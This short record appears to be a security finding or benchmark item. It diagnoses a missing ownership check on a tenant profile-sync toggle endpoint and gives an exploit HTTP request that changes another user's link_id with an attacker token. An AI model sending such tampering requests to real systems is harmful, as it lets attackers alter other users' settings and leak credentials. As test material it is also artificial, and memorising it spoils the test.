diagnosis: The endpoint updates the sync_to_public_schema setting on TenantUserProfileLink by link_id without verifying that link.user matches request.user. An attacker can tamper with profile synchronization flags of other tenant users, leaking or disabling synchronization of private tenant credentials and profile fields.
exploit_request:
POST /api/tenants/profile-sync/toggle/ HTTP/1.1
Host: id.enterprise-cloud.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"link_id": 1104, "enable_sync": true}
